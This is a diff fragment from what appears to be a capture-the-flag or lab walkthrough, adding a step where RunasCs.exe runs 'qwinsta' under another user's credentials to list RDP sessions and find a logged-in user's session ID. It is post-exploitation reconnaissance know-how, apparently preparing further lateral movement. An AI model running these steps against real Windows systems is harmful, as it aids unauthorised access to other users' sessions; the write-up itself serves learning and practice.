@@ -361,6 +361,18 @@ RunasCs.exe                                                                     
 This uploaded it
 
 ```python
+PS C:\Users\simon.watson\Desktop> C:\programdata\RunasCs.exe user pass qwinsta -l 9 
+
+ SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
+>services                                    0  Disc
+ rdp-tcp#0         nigel.mills               1  Active
+ console                                     2  Conn
+ rdp-tcp                                 65536  Listen
+PS C:\Users\simon.watson\Desktop>
+```
+Found `nigels` session ID `1`
+
+```python
 
 ```
 
